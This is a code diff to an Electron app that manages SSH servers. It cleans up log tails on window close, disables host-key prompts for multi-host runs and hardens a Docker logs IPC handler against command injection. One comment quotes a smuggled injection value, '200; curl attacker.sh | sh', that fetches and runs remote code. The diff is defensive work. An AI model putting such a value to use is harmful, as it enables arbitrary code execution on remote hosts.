@@ -305,6 +305,17 @@ function createWindow(): void {
     // with nowhere left to report. The id is captured above because the
     // WebContents is already gone by the time this fires.
     localDisposeForWebContents(wcId)
+
+    // Same reasoning, and it has to be HERE rather than only in `before-quit`.
+    // On macOS `window-all-closed` deliberately does not quit, so closing the
+    // window fires neither handler: every `journalctl -f` kept running on every
+    // selected host, holding a pooled SSH channel, until the user quit the app
+    // — exactly the leak the disposal was added to prevent. A broadcast likewise
+    // kept working through its queue for a window that no longer existed, and on
+    // `activate` a new window would receive events carrying tailIds it filters
+    // out, so the streams were invisible and unstoppable.
+    logTailer.disposeAll()
+    broadcast.disposeAll()
   })
 
   if (isDev && process.env['ELECTRON_RENDERER_URL']) {
@@ -613,7 +624,10 @@ ipcMain.handle('fleet:status', () => fleetSampler.status())
 // one would be an accident rather than a decision.
 const broadcast = new BroadcastRunner({
   exec: async (cfg, command, timeoutMs) => {
-    const r = await sshExec(resolveChainSecrets(cfg as SshConnectConfig), command, timeoutMs)
+    // allowPrompt false: a fan-out across fifteen hosts with unknown keys would
+    // raise fifteen stacked trust dialogs, and a stack of identical modals is
+    // not a decision anyone can reason about. Such a host fails with a reason.
+    const r = await sshExec(resolveChainSecrets(cfg as SshConnectConfig), command, timeoutMs, false)
     return { ok: r.ok, code: r.code, stdout: r.stdout, stderr: r.stderr, error: r.error, truncated: r.truncated }
   },
   emit: (progress: BroadcastProgress) => {
@@ -636,7 +650,8 @@ ipcMain.handle('broadcast:cancel', (_e, runId: string) => broadcast.cancel(runId
 // confirmation broadcast requires.
 const logTailer = new LogTailer({
   execStream: (cfg, command, handlers) =>
-    sshExecStream(resolveChainSecrets(cfg as SshConnectConfig), command, handlers),
+    // Same reason as broadcast: several hosts at once, no stacked dialogs.
+    sshExecStream(resolveChainSecrets(cfg as SshConnectConfig), command, handlers, false),
   emitLine: (line: LogLine) => {
     if (mainWindow && !mainWindow.isDestroyed()) mainWindow.webContents.send('logtail:line', line)
   },
@@ -655,14 +670,6 @@ ipcMain.handle('logtail:stop', (_e, tailId: string) => {
   return true
 })
 
-// ---- What is scheduled across the estate ----
-//
-// Read-only. The command is a constant in shared/cron.ts, not built from any
-// input, and every section carries its own `|| true` so a host with no
-// /etc/cron.d — or a user with no crontab — still returns the other sections
-// rather than failing the collection.
-//
-// Sequential across hosts, like the fleet sweep, for the same bastion reason.
 // ---- Docker ----
 //
 // Shelling out to the host's own `docker` binary rather than speaking the API:
@@ -675,30 +682,66 @@ ipcMain.handle('logtail:stop', (_e, tailId: string) => {
 // `docker exec` is arbitrary code execution on the host and membership of the
 // docker group is root-equivalent on most installs. The module is off by
 // default for that reason.
+//
+// To be exact about what "off" buys, because the sentence above on its own
+// implies more than is true: the module toggle hides the UI. Every handler here
+// is registered at boot regardless of `settings.modules`, so turning Docker off
+// removes the panel, not the channel. That is consistent with the model — the
+// renderer is not a trust boundary, and anyone who can drive it already has a
+// terminal on these hosts — but it is not the same as the feature being absent,
+// and a reader of the paragraph above could reasonably assume otherwise.
 const dockerReader = new DockerReader({
   exec: (cfg, command, timeoutMs) =>
+    // allowPrompt left TRUE here, unlike broadcast, log tailing and cron, and
+    // the difference is deliberate. Those three fan out; this reads ONE server
+    // the user just chose from a dropdown and pressed a button for. That is
+    // precisely the moment a trust-on-first-use dialog is answerable — "I am
+    // connecting to this host right now, is that its fingerprint?" — rather than
+    // one of fifteen identical modals nobody can reason about.
     sshExec(resolveChainSecrets(cfg as SshConnectConfig), command, timeoutMs)
 })
 
 ipcMain.handle('docker:list', (_e, cfg: unknown) => dockerReader.list(cfg))
-ipcMain.handle('docker:logs', async (_e, cfg: unknown, ref: string, lines: number) => {
+ipcMain.handle('docker:logs', async (_e, cfg: unknown, ref: string, lines: unknown) => {
+  // `lines: number` was a compile-time annotation only. IPC arguments are
+  // structured-clone values with no runtime type, so a renderer — or anything
+  // that can reach this channel — could pass "200; curl attacker.sh | sh" and
+  // have it interpolated straight into the command. Coerced and clamped here,
+  // and validated again inside buildDockerLogsCommand, because the argument
+  // that is not a string is exactly the one nobody thinks to check.
+  const n = Math.min(5_000, Math.max(1, Math.floor(Number(lines))))
+  const safeLines = Number.isFinite(n) ? n : 200
   // buildDockerLogsCommand throws on an invalid reference rather than escaping
   // it; let that surface as a rejected invoke rather than running anything.
   const r = await sshExec(
     resolveChainSecrets(cfg as SshConnectConfig),
-    buildDockerLogsCommand(ref, lines),
+    buildDockerLogsCommand(ref, safeLines),
     20_000
   )
   return { ok: r.ok, output: `${r.stdout ?? ''}${r.stderr ?? ''}`, error: r.error }
 })
 
+// ---- What is scheduled across the estate ----
+//
+// Read-only. The command is a constant in shared/cron.ts, not built from any
+// input, and every section carries its own `|| true` so a host with no
+// /etc/cron.d — or a user with no crontab — still returns the other sections
+// rather than failing the collection.
+//
+// Sequential across hosts, like the fleet sweep, for the same bastion reason.
 ipcMain.handle(
   'cron:collect',
   async (_e, targets: { serverId: string; serverName: string; cfg: unknown }[]) => {
     const out: { serverId: string; serverName: string; entries: CronEntry[]; unparsed: number; error?: string }[] = []
     for (const t of targets) {
       try {
-        const r = await sshExec(resolveChainSecrets(t.cfg as SshConnectConfig), CRON_COLLECT_COMMAND, 20_000)
+        // Reads every online server in one press; same stacked-dialog problem.
+        const r = await sshExec(
+          resolveChainSecrets(t.cfg as SshConnectConfig),
+          CRON_COLLECT_COMMAND,
+          20_000,
+          false
+        )
         if (!r.ok) {
           out.push({ serverId: t.serverId, serverName: t.serverName, entries: [], unparsed: 0, error: r.error })
           continue
